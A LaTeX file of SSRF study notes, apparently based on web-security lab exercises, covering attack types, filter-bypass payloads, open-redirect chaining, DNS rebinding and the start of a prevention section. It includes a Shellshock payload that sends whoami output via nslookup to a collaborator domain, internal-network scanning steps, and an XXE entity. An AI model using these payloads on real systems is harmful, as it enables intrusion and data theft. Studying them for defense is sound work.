@@ -1,0 +1,707 @@
+\documentclass{article}
+\usepackage[utf8]{inputenc}
+\usepackage[T1]{fontenc}
+\usepackage{url}
+\usepackage{graphicx}
+\usepackage{geometry}
+\usepackage{listings}
+\usepackage{hyperref}
+\usepackage{multicol}
+\usepackage{array}
+\usepackage{booktabs}
+\usepackage{xcolor}
+\lstset{numbers=none, basicstyle=\ttfamily}
+\renewcommand{\lstlistingname}
+
+\geometry{a4paper, left=20mm, right=20mm, top=20mm, bottom=20mm}
+\title{SSRF notes}
+\author{Eyad Islam El-Taher}
+
+\begin{document}
+\maketitle
+
+\section*{What is SSRF}
+
+\textbf{Server-Side Request Forgery (SSRF)} is a vulnerability where an attacker tricks a server into making a request to a location it shouldn't.
+
+Think of the server as a \textbf{proxy}. Normally, a server takes a request from a user and fetches data from the public internet. In an SSRF attack, the attacker provides a URL (like an internal IP address) that the server then "fetches" on the attacker's behalf.
+
+\subsection*{How the Attack Works}
+
+\begin{itemize}
+    \item \textbf{Normal Request:} A user asks the server to "Fetch my profile picture from \texttt{images.com}." The server complies and shows the image.
+    \item \textbf{SSRF Attack:} An attacker asks the server to "Fetch data from \texttt{http://localhost/admin}." Because the server trusts itself, it fetches its own private admin page and sends it to the attacker.
+\end{itemize}
+
+
+
+\subsection*{Important note}
+In a Server-Side Request Forgery (SSRF) attack, the attacker can abuse functionality on the server to read or update \textbf{internal resources}. The attacker can supply or modify a URL which the code running on the server will read or submit data to, and by carefully selecting the URLs, the attacker may be able to read server configuration such as AWS metadata, connect to internal services like http enabled databases or perform post requests towards internal services which are not intended to be exposed.
+
+
+\subsection*{The Logic}
+In simple terms, the vulnerability occurs when the Attacker ($A$) controls the destination ($D$) of a request made by the Server ($S$):
+
+\[ A \to S \to D \]
+
+Where $D$ is a sensitive internal resource that the attacker cannot reach directly.
+
+\section*{Types of SSRF}
+
+SSRF vulnerabilities are generally categorized based on whether the attacker can see the server's response.
+
+\subsection*{1. Basic (In-Band) SSRF}
+In a Basic SSRF, the server fetches data from the internal resource and sends the full response back to the attacker.
+
+\begin{itemize}
+    \item \textbf{Scenario:} The attacker requests \texttt{http://127.0.0.1/admin}.
+    \item \textbf{Result:} The server displays the administrative dashboard directly on the attacker's screen.
+    \item \textbf{Impact:} High. It allows for direct data exfiltration and easy exploration of the internal network.
+\end{itemize}
+
+
+
+\subsection*{2. Blind SSRF}
+In a Blind SSRF, the server makes the request to the target URL, but it \textbf{does not} return the response data to the attacker. The attacker must look for "side-channel" clues to confirm the attack worked.
+
+\begin{itemize}
+    \item \textbf{How to Detect:}
+    \begin{itemize}
+        \item \textbf{Response Time:} If the server takes 10 seconds to respond to an internal IP but 1 second to a dead IP, the internal IP is likely "alive."
+        \item \textbf{HTTP Status Codes:} The server might return a \texttt{200 OK} for a valid internal service and a \texttt{500 Error} for an invalid one.
+        \item \textbf{Out-of-Band:} The attacker forces the server to reach out to a server they control (like a Burp Collaborator instance) to log the connection.
+    \end{itemize}
+\end{itemize}
+
+
+
+\subsection*{Summary Table}
+\begin{center}
+\begin{tabular}{|l|l|l|}
+\hline
+\textbf{Feature} & \textbf{Basic SSRF} & \textbf{Blind SSRF} \\ \hline
+Response Visible & Yes & No \\ \hline
+Data Exfiltration & Easy (Direct) & Hard (Indirect) \\ \hline
+Primary Goal & Reading sensitive data & Port scanning / Remote attacks \\ \hline
+\end{tabular}
+\end{center}
+
+\section*{SSRF vulnerabilities happen when}
+
+SSRF occurs because of a breakdown in trust between the user's input and the server's networking functions. Specifically, it happens when:
+
+\subsection*{1. Unvalidated User Input}
+The application takes a URL or a hostname from a user and uses it in a server-side request without checking where it points.
+\begin{itemize}
+    \item \textbf{Example:} A "Import from URL" feature that allows \texttt{http://169.254.169.254} instead of only \texttt{https://trusted-site.com}.
+\end{itemize}
+
+\subsection*{2. Trusting the Internal Network}
+Many developers assume that because a service (like a database or admin panel) is "internal," it doesn't need a password or strong security.
+\begin{itemize}
+    \item \textbf{The Flaw:} When the server makes the request, it acts as a "trusted insider," bypassing the firewall that keeps the Attacker out.
+\end{itemize}
+
+
+
+\subsection*{3. Poorly Configured Blocklists}
+Sometimes developers try to block "bad" words like \texttt{localhost} or \texttt{127.0.0.1}. Attackers can easily bypass these using:
+\begin{itemize}
+    \item \textbf{Alternative IP Formats}
+    \item \textbf{DNS Rebinding} 
+    \item \textbf{Redirects}
+\end{itemize}
+
+
+\section*{Where to Find SSRF Vulnerabilities}
+
+SSRF is commonly found in features that require the server to act as a client to fetch external data. Look for parameters that contain URLs, IP addresses, or hostnames.
+
+\subsection*{1. Common Application Features}
+Check any functionality that processes external links:
+\begin{itemize}
+    \item \textbf{Profile Pictures:} Uploading an image via a URL (e.g., \texttt{?avatar=http://site.com/img.jpg}).
+    \item \textbf{Webhooks:} Providing a URL for the server to send notifications to.
+    \item \textbf{File Converters:} Converting a URL to a PDF or a document (e.g., \texttt{?url=https://target.com}).
+    \item \textbf{Proxy Services:} Features designed to fetch content from other sites to bypass CORS or provide "anonymity."
+    \item \textbf{Import/Export:} Importing data from an external RSS feed, spreadsheet, or API.
+\end{itemize}
+
+
+
+\subsection*{2. Vulnerable Parameters}
+When spidering a website, keep an eye out for these specific parameter names:
+\begin{center}
+\begin{tabular}{|l|l|l|}
+\hline
+\texttt{dest} & \texttt{redirect} & \texttt{uri} \\ \hline
+\texttt{path} & \texttt{continue} & \texttt{window} \\ \hline
+\texttt{url} & \texttt{callback} & \texttt{feed} \\ \hline
+\texttt{to} & \texttt{out} & \texttt{view} \\ \hline
+\end{tabular}
+\end{center}
+
+
+
+\subsection*{3. PDF Generators}
+Many applications use libraries (like \texttt{wkhtmltopdf}) to turn HTML into PDFs. If you can inject an \texttt{<iframe>} or \texttt{<img>} tag pointing to an internal IP, the server may "render" the internal resource into the PDF it gives back to you.
+
+\section*{Impact of SSRF Attacks}
+
+The severity of an SSRF vulnerability is determined by the level of access the vulnerable server has to other internal systems.
+
+\subsection*{1. Access to Internal Services}
+Attackers can interact with services that were never intended to be public.
+\begin{itemize}
+    \item \textbf{Admin Panels:} Accessing internal dashboards (e.g., \texttt{/admin}, \texttt{/manager}) that don't have passwords because they assume only "internal" users can reach them.
+    \item \textbf{Databases:} Interacting with local databases like Redis, MongoDB, or Memcached to steal or delete data.
+\end{itemize}
+
+\subsection*{2. Internal Port Scanning}
+An attacker can use the vulnerable server as a "pivot" to map out the internal network.
+\begin{itemize}
+    \item By observing response times or HTTP status codes, the attacker can identify which internal IP addresses and ports (e.g., 22 for SSH, 80 for HTTP, 443 for HTTPS) are active.
+\end{itemize}
+
+\subsection*{3. Remote Code Execution (RCE)}
+In some cases, SSRF can lead to full command execution:
+\begin{itemize}
+    \item \textbf{Protocol Smuggling:} Using schemes like \texttt{gopher://} to send complex commands to internal services like Redis or an SMTP server.
+    \item \textbf{Software Exploitation:} Attacking unpatched internal tools that have known vulnerabilities.
+\end{itemize}
+
+\subsection*{Summary Table of Impact}
+\begin{center}
+\begin{tabular}{|l|l|}
+\hline
+\textbf{Target} & \textbf{Potential Impact} \\ \hline
+Localhost & Access to local files, logs, and admin tools \\ \hline
+Internal Network & Port scanning and lateral movement \\ \hline
+Internal APIs & Data manipulation and Remote Code Execution \\ \hline
+\end{tabular}
+\end{center}
+
+\section*{How to exploit SSRF vulnerbilities?}
+\subsection*{1. Exploiting In-Band SSRF}
+In an SSRF attack against the server, the attacker causes the application to make an HTTP request back to the server that is hosting the application, via its loopback network interface. This typically involves supplying a URL with a hostname like \texttt{127.0.0.1} (a reserved IP address that points to the loopback adapter) or \texttt{localhost} (a commonly used name for the same adapter).
+
+\subsubsection*{Example Scenario: Shopping Application}
+Imagine a shopping application that lets the user view whether an item is in stock in a particular store. To provide the stock information, the application must query various back-end REST APIs. It does this by passing the URL to the relevant back-end API endpoint via a front-end HTTP request.
+
+When a user views the stock status for an item, their browser makes the following request:
+
+\begin{verbatim}
+POST /product/stock HTTP/1.1
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 118
+
+stockApi=http://stock.weliketoshop.net:8080/product/stock/check%3FproductId%3D6%26storeId%3D1
+\end{verbatim}
+
+This causes the server to make a request to the specified URL, retrieve the stock status, and return this to the user.
+
+
+
+\subsubsection*{The Attack}
+In this example, an attacker can modify the request to specify a URL local to the server:
+
+\begin{verbatim}
+POST /product/stock HTTP/1.1
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 118
+
+stockApi=http://localhost/admin
+\end{verbatim}
+
+The server fetches the contents of the \texttt{/admin} URL and returns it to the user.
+
+\subsubsection*{Why this works (Trust Issues)}
+An attacker can visit the \texttt{/admin} URL directly, but administrative functionality is normally only accessible to authenticated users. However, if the request to the \texttt{/admin} URL comes from the \textbf{local machine}, the normal access controls are often bypassed. 
+
+The application grants full access to the administrative functionality because the request appears to originate from a \textit{trusted location} (the server itself).
+
+\subsubsection*{The Logic of Trust Bypasses}
+
+In many environments, SSRF becomes critical because of how internal trust is architected:
+
+\begin{itemize}
+    \item \textbf{Decoupled Access Control:} The access control check might be implemented in a different component (like a Reverse Proxy or WAF) that sits in front of the application server. When a connection is made \textit{directly} back to the server via SSRF, this external check is bypassed.
+    \item \textbf{Disaster Recovery Mechanisms:} For disaster recovery, an application might allow administrative access without logging in to any user coming from the local machine. This assumes that only a fully trusted user would have direct access to the server's console or loopback interface.
+    \item \textbf{Hidden Services:} The administrative interface might listen on a different port number than the main application (e.g., port 8080 or 9000) and may be firewalled from external users, but reachable via the server itself.
+\end{itemize}
+
+
+\subsubsection*{Practical Example: Brute Forcing Internal IP Ranges}
+
+If you identify a potential SSRF in a stock-check feature, you can use a proxy tool like Burp Suite to map the internal network.
+
+\begin{enumerate}
+    \item \textbf{Intercept:} Visit a product, click ``Check stock,'' and intercept the request in Burp Suite. Send it to \textbf{Burp Intruder}.
+    \item \textbf{Set Payload Position:} Change the \texttt{stockApi} parameter to target an internal range: \\
+    \texttt{stockApi=http://192.168.0.§1§:8080/admin} \\
+    Highlight the final octet and click \textbf{Add §}.
+    \item \textbf{Configure Payloads:} 
+    \begin{itemize}
+        \item Payload type: \textbf{Numbers}.
+        \item Settings: From \texttt{1}, To \texttt{255}, Step \texttt{1}.
+    \end{itemize}
+    \item \textbf{Analyze Results:} Start the attack. Sort the results by the \textbf{Status} column. A \texttt{200 OK} response indicates a live internal administrative interface.
+    \item \textbf{Execute Action:} Once the interface is found (e.g., at IP \texttt{.12}), send the request to \textbf{Burp Repeater} and modify the path to perform an action, such as deleting a user: \\
+    \texttt{stockApi=http://192.168.0.12:8080/admin/delete?username=carlos}
+\end{enumerate}
+
+
+
+\begin{quote}
+    \textit{Note: These trust relationships, where requests originating from the local machine are handled with higher privileges, are what elevate SSRF to a critical vulnerability.}
+\end{quote}
+
+\section*{Circumventing Common SSRF Defenses}
+
+It is common to see applications containing SSRF behavior paired with defenses aimed at preventing exploitation. However, these defenses are often based on pattern matching and can be circumvented with specific bypass techniques.
+
+\subsection*{SSRF with Blacklist-Based Input Filters}
+
+Some applications block input containing sensitive hostnames like \texttt{127.0.0.1} and \texttt{localhost}, or specific keywords like \texttt{/admin}. In these situations, the following techniques can often bypass the filter:
+
+\begin{itemize}
+    \item \textbf{Alternative IP Representation:} Use different formats for the loopback address that the filter might not recognize:
+    \begin{itemize}
+        \item \textbf{Decimal:} \texttt{2130706433}
+        \item \textbf{Octal:} \texttt{017700000001}
+        \item \textbf{Shortened:} \texttt{127.1}
+    \end{itemize}
+
+    \item \textbf{DNS Pinning / Custom Domains:} Register a domain name that resolves to \texttt{127.0.0.1}. 
+    \begin{itemize}
+        \item Example: \texttt{spoofed.burpcollaborator.net}
+        \item This works because the application checks the hostname string (which looks safe) instead of the IP it resolves to.
+    \end{itemize}
+
+    \item \textbf{Obfuscation:} Hide blocked strings using encoding or capitalization tricks:
+    \begin{itemize}
+        \item \textbf{URL Encoding:} Use double encoding or hex variations (e.g., \texttt{\%61dmin}).
+        \item \textbf{Case Variation:} If the filter is case-sensitive, try \texttt{/Admin} or \texttt{/ADMIN}.
+    \end{itemize}
+
+    \item \textbf{Redirect Bypasses:} Provide a URL you control which performs a \texttt{302 Redirect} to the target internal URL.
+    \begin{itemize}
+        \item \textbf{Protocol Switching:} Try switching from \texttt{http:} to \texttt{https:} during the redirect. Some filters only check the initial URL provided and fail to re-validate the destination after the redirect.
+    \end{itemize}
+\end{itemize}
+
+
+
+\begin{quote}
+    \textbf{Note:} Blacklists are generally considered a weak defense. A single mistake in the regular expression or an overlooked encoding format is enough for an attacker to gain access.
+\end{quote}
+
+\section*{SSRF with Whitelist-Based Input Filters}
+
+Some applications only allow inputs that match a \textbf{whitelist} of permitted values (e.g., only allowing URLs starting with \texttt{https://trusted-app.com}). These filters often look for the required string at the beginning of the input or anywhere within the string. 
+
+You can often bypass these filters by exploiting inconsistencies in how the validation logic and the back-end request library parse URLs.
+
+\subsection*{URL Parsing Tricks}
+
+The URL specification contains several features that are often overlooked by ad-hoc parsing and validation logic:
+
+\begin{itemize}
+    \item \textbf{Embedded Credentials (@):} You can embed credentials in a URL before the hostname using the \texttt{@} character. The validator might see the "expected host" at the start, but the requester will actually go to the "evil host."
+    \begin{quote}
+        \texttt{https://expected-host:fakepassword@evil-host}
+    \end{quote}
+
+    \item \textbf{URL Fragments (\#):} You can use the \texttt{\#} character to indicate a URL fragment. Some parsers stop reading at the fragment, while others might misinterpret where the hostname ends.
+    \begin{quote}
+        \texttt{https://evil-host\#expected-host}
+    \end{quote}
+
+    \item \textbf{DNS Hierarchy:} You can leverage the DNS naming hierarchy to place the required input into a fully-qualified DNS name that you control.
+    \begin{quote}
+        \texttt{https://expected-host.evil-host}
+    \end{quote}
+
+    \item \textbf{Encoding and Double-Encoding:} URL-encoding characters (like \texttt{@} or \texttt{\#}) can confuse parsing code. If the filter decodes the string once but the back-end requester decodes it again (recursive decoding), you can hide malicious destinations inside encoded strings.
+    \begin{itemize}
+        \item Example: \texttt{\%23} for \texttt{\#}, or \texttt{\%2523} for a double-encoded \texttt{\#}.
+    \end{itemize}
+
+    \item \textbf{Combinations:} Most successful bypasses use a mix of these. For example, using an encoded \texttt{@} and a fragment together to satisfy a complex regex filter.
+\end{itemize}
+
+
+
+\begin{quote}
+    \textbf{Crucial Concept:} These bypasses work because of a \textit{discrepancy} between two components: one component validates the URL, but a second component (the one actually making the request) interprets the URL differently.
+\end{quote}
+
+
+\subsection*{Example: Bypassing Whitelists via Parsing Confusion}
+
+This example demonstrates how an attacker can exploit differences in how an application \textit{validates} a URL versus how it \textit{executes} the request.
+
+\textbf{Payload:}
+\begin{verbatim}
+http://localhost:80%2523@stock.weliketoshop.net/admin/delete?username=carlos
+\end{verbatim}
+
+\subsubsection*{The Vulnerability Logic}
+
+\begin{enumerate}
+    \item \textbf{The Defense Mechanism:} 
+    The application extracts the hostname from the \texttt{stockApi} parameter and compares it against a whitelist (e.g., \texttt{stock.weliketoshop.net}).
+    
+    \item \textbf{Exploiting User Info (\texttt{@}):} 
+    URLs allow the format \texttt{http://username@hostname/}. A validator may see \texttt{stock.weliketoshop.net} as the host, even if it is preceded by an \texttt{@} symbol.
+    
+    \item \textbf{Exploiting Fragments (\texttt{\#}):} 
+    The \texttt{\#} character marks the start of a URL fragment, which is typically ignored by the server-side request engine.
+    
+    \item \textbf{The Double-Encoding Trick (\texttt{\%2523}):}
+    \begin{itemize}
+        \item \texttt{\%23} decodes to \texttt{\#}
+        \item \texttt{\%2523} is a double-encoded \texttt{\#} (where \texttt{\%25} is the \% sign).
+    \end{itemize}
+\end{enumerate}
+
+
+
+\subsubsection*{Step-by-Step Execution}
+
+\begin{description}
+    \item[Phase A: Validation] The application logic parses the URL string. It identifies \texttt{stock.weliketoshop.net} as the hostname because the \texttt{\%2523} hasn't been fully decoded into a fragment delimiter yet. The whitelist check passes \textbf{OK}.
+    
+    \item[Phase B: Backend Request] Before the backend library makes the actual network call, it performs another round of URL decoding. 
+    \[ \%2523 \to \%23 \to \# \]
+    The URL is now interpreted as: \texttt{http://localhost:80\#@stock.weliketoshop.net...}
+    
+    \item[Phase C: The Request] Because everything after \texttt{\#} is treated as a fragment and discarded by the request engine, the server is tricked into making a request to its own loopback interface:
+    \begin{verbatim}
+    Target: http://localhost:80/admin/delete?username=carlos
+    \end{verbatim}
+\end{description}
+
+\textbf{Result:} The whitelist is bypassed, the internal connection to \texttt{localhost} is established, and the administrative action (deleting user \texttt{carlos}) is performed.
+
+\section*{Bypassing SSRF Filters via Open Redirection}
+
+Even when an application uses strict whitelists that are difficult to confuse with parsing tricks, it may still be vulnerable if it trusts a domain that contains an \textbf{Open Redirection} vulnerability.
+
+If the back-end HTTP library used by the server is configured to follow redirections (like HTTP 301 or 302), an attacker can chain these two vulnerabilities to bypass the URL filter.
+
+\subsection*{The Mechanism}
+The attacker provides a URL that points to a legitimate, whitelisted domain. However, that legitimate domain then redirects the server's request to an internal, restricted IP address.
+
+
+
+\subsection*{Example Scenario}
+Imagine the application strictly validates that the \texttt{stockApi} parameter must start with \texttt{http://weliketoshop.net}.
+
+\subsubsection*{1. Identifying the Open Redirect}
+The attacker finds that a different part of the whitelisted site (\texttt{weliketoshop.net}) has an open redirect:
+\begin{verbatim}
+GET /product/nextProduct?currentProductId=6&path=http://evil-user.net
+\end{verbatim}
+This request causes the server to return a \texttt{302 Found} response pointing to \texttt{http://evil-user.net}.
+
+\subsubsection*{2. Chaining the Vulnerabilities}
+The attacker now provides the open redirect URL as the \texttt{stockApi} input, but changes the redirect target to an internal administrative IP:
+
+\begin{verbatim}
+POST /product/stock HTTP/1.0
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 118
+
+stockApi=http://weliketoshop.net/product/nextProduct?currentProductId=6&path=http://192.168.0.68/admin
+\end{verbatim}
+
+\subsubsection*{3. The Execution Flow}
+\begin{enumerate}
+    \item \textbf{Validation:} The application checks if \texttt{stockApi} starts with \texttt{weliketoshop.net}. It does, so validation passes \textbf{OK}.
+    \item \textbf{Initial Request:} The server makes a request to its own whitelisted product page.
+    \item \textbf{The Redirect:} The product page returns a 302 redirect to \texttt{http://192.168.0.68/admin}.
+    \item \textbf{The SSRF:} The server's HTTP client follows the redirect and makes a second request—this time to the \textbf{internal admin IP}.
+\end{enumerate}
+
+
+\subsection*{2. Exploiting Blind SSRF}
+\section*{Blind SSRF Vulnerabilities}
+
+Blind SSRF occurs when an application can be induced to issue a back-end HTTP request to a supplied URL, but the response from that request is \textbf{not} returned in the application's front-end response.
+
+\subsection*{Impact of Blind SSRF}
+The impact is generally lower than Regular SSRF because it is a one-way communication. You cannot trivially read sensitive data from internal systems. However, it can still be used for:
+\begin{itemize}
+    \item \textbf{Internal Reconnaissance:} Probing internal networks for "live" hosts.
+    \item \textbf{Exploiting Internal Vulnerabilities:} Sending payloads (like Shellshock) to internal servers.
+    \item \textbf{Remote Code Execution (RCE):} Attacking the server's own HTTP client library.
+\end{itemize}
+
+\subsection*{Finding Blind SSRF: Out-of-Band (OAST) Techniques}
+The most reliable way to detect blind SSRF is to trigger an HTTP request to an external system you control (e.g., \textbf{Burp Collaborator}).
+
+
+
+\subsubsection*{The Detection Process}
+\begin{enumerate}
+    \item Generate a unique domain name using Burp Collaborator.
+    \item Send this domain in the suspicious parameter (e.g., \texttt{Referer} header or a URL parameter).
+    \item Monitor the Collaborator client for interactions.
+\end{enumerate}
+
+\begin{quote}
+    \textbf{Note on DNS vs. HTTP:} It is common to see a \textbf{DNS lookup} but no subsequent \textbf{HTTP request}. This usually means the server tried to resolve the domain (DNS allowed) but the actual connection was blocked by a firewall (Egress filtering).
+\end{quote}
+
+\subsection*{Exploiting Blind SSRF}
+
+Even without seeing the response, exploitation is possible through these methods:
+
+\subsubsection*{1. Blindly Probing Internal Systems}
+You can "sweep" internal IP addresses with payloads designed to trigger \textit{other} out-of-band vulnerabilities. 
+\begin{itemize}
+    \item \textbf{Example:} If an internal server is vulnerable to Shellshock, you can send a payload through the SSRF that forces that internal server to ping your Collaborator instance.
+\end{itemize}
+
+\subsubsection*{2. Attacking the HTTP Client}
+You can induce the application to connect to a server you control and return a malicious response. If the server's HTTP library (the client) has a vulnerability, you may achieve RCE.
+
+\subsubsection*{Example: Shellshock via Blind SSRF}
+In a vulnerable environment, an attacker might provide a URL to an internal server and include a Shellshock payload in a common header (like \texttt{User-Agent}):
+
+\begin{verbatim}
+GET /admin HTTP/1.1
+Referer: http://192.168.0.25:8080/
+User-Agent: () { :; }; /usr/bin/nslookup $(whoami).xtuz61irevc0rqs7soujd6j7nytthj58.oastify.com
+\end{verbatim}
+
+If the internal server at \texttt{192.168.0.25} processes this header using a vulnerable version of Bash, This payload uses nslookup to perform a DNS query. The target data (in this case, the output of the whoami command) is placed as a subdomain of your Burp Collaborator or Interactsh domain 
+
+\textbf{Explanation:}
+\begin{enumerate}
+    \item () { :;};: The Shellshock vector 
+    \item /usr/bin/nslookup: A command-line tool for DNS queries.
+    \item \$(whoami): Executes the whoami command and inserts its output.
+    \item YOUR-COLLABORATOR-DOMAIN.com: The attacker's server. The full lookup will be username.YOUR-COLLABORATOR-DOMAIN.com, allowing you to see the username in your DNS logs.
+\end{enumerate}
+
+\subsection*{Practical Note: Automating Blind SSRF Detection}
+
+Detecting Blind SSRF manually can be time-consuming. Tools like \textbf{Collaborator Everywhere} automate the process by injecting unique payloads into common HTTP headers.
+
+\subsubsection*{Workflow: Using Collaborator Everywhere}
+\begin{enumerate}
+    \item \textbf{Setup:} In Burp Suite Professional, install the \textbf{Collaborator Everywhere} extension from the BApp Store.
+    \item \textbf{Scoping:} Add the target domain to Burp Suite's \textbf{Target Scope}. This ensures the extension only tests the intended target and avoids "attacking" unrelated sites.
+    \item \textbf{Passive Discovery:} Browse the site normally. The extension will automatically add Collaborator URLs to headers like \texttt{Referer}, \texttt{X-Forwarded-For}, and \texttt{True-Client-IP}.
+    \item \textbf{Verification:}
+    \begin{itemize}
+        \item Load a product page and monitor the \textbf{Collaborator} tab.
+        \item If vulnerable, you will observe an HTTP interaction triggered by the \texttt{Referer} header.
+        \item \textbf{Key Observation:} Notice if the incoming HTTP interaction contains your original \texttt{User-Agent} string. This confirms that the back-end system is passing your headers through to its internal requests.
+    \end{itemize}
+    \item \textbf{Transition to Exploit:} Once the interaction is confirmed, send the successful request to \textbf{Burp Intruder} to begin probing for internal services or vulnerabilities like Shellshock.
+\end{enumerate}
+
+
+\section*{Finding Hidden Attack Surface for SSRF}
+
+While many SSRF vulnerabilities are obvious (parameters containing full URLs), many others are "hidden" within partial data, specific file formats, or standard HTTP headers.
+
+\subsection*{1. Partial URLs in Requests}
+Sometimes, an application only asks for a \textbf{hostname} or a \textbf{partial path} instead of a full URL.
+\begin{itemize}
+    \item \textbf{Example:} A request like \texttt{POST /api/fetch?server=internal-db-01}.
+    \item \textbf{The Mechanism:} The server-side code takes this value and strings it into a full URL: \texttt{https:// + [user\_input] + .company.internal/stats}.
+    \item \textbf{Exploitation:} While you don't control the whole URL, you may still be able to pivot. If you can input \texttt{localhost\#}, the resulting URL might become \texttt{https://localhost\#.company.internal/...}, effectively making the server request its own loopback interface.
+\end{itemize}
+
+\subsection*{2. URLs within Data Formats}
+Modern applications use structured data formats that have built-in features for fetching external resources.
+\begin{itemize}
+    \item \textbf{XML (XXE to SSRF):} XML parsers often support External Entities. An attacker can submit an XML file that tells the parser to fetch a URL.
+    \begin{verbatim}
+    <!DOCTYPE foo [ <!ENTITY xxe SYSTEM "http://internal.service/"> ]>
+    <stockCheck><productId>&xxe;</productId></stockCheck>
+    \end{verbatim}
+    \item \textbf{PDF Generators:} If a server converts HTML to PDF, you can inject \texttt{<img src="http://169.254.169.254/">}. The server will attempt to fetch that image to render the PDF.
+    \item \textbf{SVG Images:} SVGs are XML-based. An uploaded SVG can contain tags that force the server to make a request when processing the image.
+\end{itemize}
+
+
+
+\subsection*{3. SSRF via the Referer Header}
+Analytics software and logging systems often track the \texttt{Referer} header to see where traffic is coming from.
+\begin{itemize}
+    \item \textbf{The Attack:} Many analytics tools automatically visit the URL in the \texttt{Referer} header to "crawl" the referring site for SEO data or anchor text.
+    \item \textbf{Detection:} Because this happens in the background (often via a separate cron job or worker), this is almost always a \textbf{Blind SSRF}.
+\end{itemize}
+
+\begin{quote}
+    \textbf{Summary:} Always test any header or data field that could potentially lead to a server-side fetch. Even if the application "looks" safe, its background workers (PDF renderers, XML parsers, and Analytics bots) might be vulnerable.
+\end{quote}
+
+\section*{DNS Rebinding + SSRF}
+
+\textbf{DNS Rebinding} is a technique that abuses the time gap between DNS resolution and the actual application request to bypass security filters.
+
+\subsection*{The Concept}
+Normally, a server follows this logic:
+\begin{enumerate}
+    \item Receives a URL (e.g., \texttt{http://example.com}).
+    \item Resolves the domain to an IP address.
+    \item Checks if the IP is allowed (not in a ban list).
+    \item If allowed, it makes the request using the \textbf{domain name}.
+\end{enumerate}
+
+In a DNS Rebinding attack, the attacker configures a domain to resolve to different IP addresses at different times.
+\begin{itemize}
+    \item \textbf{First resolution:} Returns a safe public IP to pass validation.
+    \item \textbf{Second resolution:} Returns an internal IP (like \texttt{127.0.0.1}) for the actual request.
+\end{itemize}
+
+
+
+\subsection*{Technically Vulnerable Logic}
+The attack exploits a "Time-of-Check to Time-of-Use" (TOCTOU) flaw. Because the application resolves the domain twice, the result of the second resolution can be different from the first.
+
+\begin{verbatim}
+# Example of vulnerable Python logic
+ipaddr = socket.gethostbyname(url)
+if ipaddr not in ip_ban:
+    # The application resolves the URL AGAIN here!
+    response = requests.get(url) 
+\end{verbatim}
+
+\subsection*{Step-by-Step Attack Plan}
+
+\begin{enumerate}
+    \item \textbf{Identify SSRF Sink:} Look for features like PDF generators, webhooks, or image fetchers.
+    \item \textbf{Confirm Blocking:} Verify that direct input like \texttt{http://127.0.0.1} is blocked.
+    \item \textbf{Setup Infrastructure:} Use a domain with **TTL = 0** (to prevent the server from caching the first "safe" IP).
+    \item \textbf{Configure Two IPs:} Set the DNS to alternate between a Public IP (to pass the filter) and the Target Internal IP (to hit the internal service).
+    \item \textbf{Execute:} Send multiple requests. Eventually, the timing will align so that validation hits the public IP and the request hits the internal IP.
+\end{enumerate}
+
+\subsection*{Real Example Flow: PDF Generator}
+
+\begin{center}
+\begin{tabular}{|l|l|l|}
+\hline
+\textbf{Step} & \textbf{DNS Resolution} & \textbf{Result} \\ \hline
+1. Validation & \texttt{attacker.com} $\to$ \texttt{8.8.8.8} & Allowed (Passed) \\ \hline
+2. DNS Change & \texttt{attacker.com} $\to$ \texttt{127.0.0.1} & Record updated \\ \hline
+3. Fetching & \texttt{attacker.com} $\to$ \texttt{127.0.0.1} & \textbf{Internal Data Fetched!} \\ \hline
+\end{tabular}
+\end{center}
+
+\begin{quote}
+    \textbf{Note:} To defend against this, applications should resolve the hostname \textbf{once}, store the IP address, and make the request directly to that IP.
+\end{quote}
+
+\section*{Practical DNS Rebinding with Helper Services}
+
+Using a dedicated rebinding service like \texttt{lock.cmpxchg8b.com} simplifies the exploitation process by providing a controlled environment for DNS record switching.
+
+\subsection*{How a Rebinding Service Functions}
+A rebinding service provides a specialized DNS infrastructure that automates the "IP swapping" logic.
+
+\begin{itemize}
+    \item \textbf{Dynamic Resolution:} It generates a unique subdomain that resolves to IP \#1 on the first query and IP \#2 on the subsequent query.
+    \item \textbf{Anti-Caching (TTL 0):} It sets the Time-to-Live (TTL) to 0, forcing the victim's server to ask the DNS server for the IP address every single time rather than using a saved (cached) result.
+\end{itemize}
+
+
+
+\subsection*{Conceptual Attack Flow}
+
+\begin{enumerate}
+    \item \textbf{Configuration:} You provide two IPs to the service:
+    \begin{itemize}
+        \item \textbf{First IP:} A safe public IP (e.g., \texttt{8.8.8.8}).
+        \item \textbf{Second IP:} The internal target (e.g., \texttt{127.0.0.1} or \texttt{169.254.169.254}).
+    \end{itemize}
+    The tool generates a subdomain, such as: \texttt{abc123.lock.cmpxchg8b.com}.
+
+    \item \textbf{Submission:} You submit this domain to the vulnerable SSRF endpoint.
+    \begin{quote}
+        Example: \texttt{POST /generate-pdf?url=http://abc123.lock.cmpxchg8b.com}
+    \end{quote}
+
+    \item \textbf{Internal Processing:}
+    \begin{itemize}
+        \item \textbf{Step A (Validation):} The server resolves the domain. The rebinder returns the \textbf{Public IP}. The filter sees a safe IP and allows the request.
+        \item \textbf{Step B (Fetch):} The server resolves the domain a second time to perform the actual GET request. The rebinder now returns the \textbf{Internal IP}.
+    \end{itemize}
+\end{enumerate}
+
+\subsection*{The Necessity of Multiple Attempts}
+Because DNS rebinding relies on the timing of two distinct resolution events, it is not always 100\% consistent. You may need to send 10--20 requests to align the timing correctly:
+
+\begin{itemize}
+    \item \textbf{Fail Case 1:} Both resolutions hit the Public IP (No SSRF occurs).
+    \item \textbf{Fail Case 2:} Both resolutions hit the Internal IP (Filter blocks the request).
+    \item \textbf{Success Case:} First resolution is Public, second is Internal (Bypass successful).
+\end{itemize}
+
+\begin{quote}
+    \textbf{Pro-Tip:} In real-world assessments, if you see a "Connection Refused" after a few attempts on a domain you know is rebinding, it’s a strong indicator that you successfully bypassed the filter but hit a closed port on the internal target.
+\end{quote}
+
+\newpage
+\section*{How to Prevent SSRF Vulnerabilities}
+
+Preventing SSRF requires a layered defense strategy that addresses the network, the application logic, and the server configuration.
+
+\subsection*{1. Use Allow-lists (Whitelisting)}
+Instead of trying to block "bad" IPs (which can be bypassed via encoding or rebinding), only allow requests to a predefined list of trusted domains or IP addresses.
+\begin{itemize}
+    \item \textbf{Strict Matching:} Use exact string matching rather than regular expressions where possible.
+    \item \textbf{Validation:} Ensure the protocol is restricted to \texttt{http} or \texttt{https} only, disabling \texttt{file://}, \texttt{gopher://}, or \texttt{dict://}.
+\end{itemize}
+
+\subsection*{2. Network-Level Isolation}
